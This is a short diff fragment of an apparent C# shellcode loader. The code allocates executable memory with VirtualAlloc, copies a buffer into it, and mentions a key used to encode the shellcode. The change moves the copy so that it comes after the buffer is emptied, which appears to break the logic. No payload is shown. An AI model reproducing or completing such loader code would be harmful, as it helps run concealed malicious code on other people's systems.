@@ -30,9 +30,9 @@ namespace ConsoleApp1 {
 			
 			IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40); 
 			
-			Marshal.Copy(buf, 0, addr, size);
-			
 			buf = new byte[0];
+			
+			Marshal.Copy(buf, 0, addr, size);
 			
 			int key = 666; // key used to encode the shellcode
 			
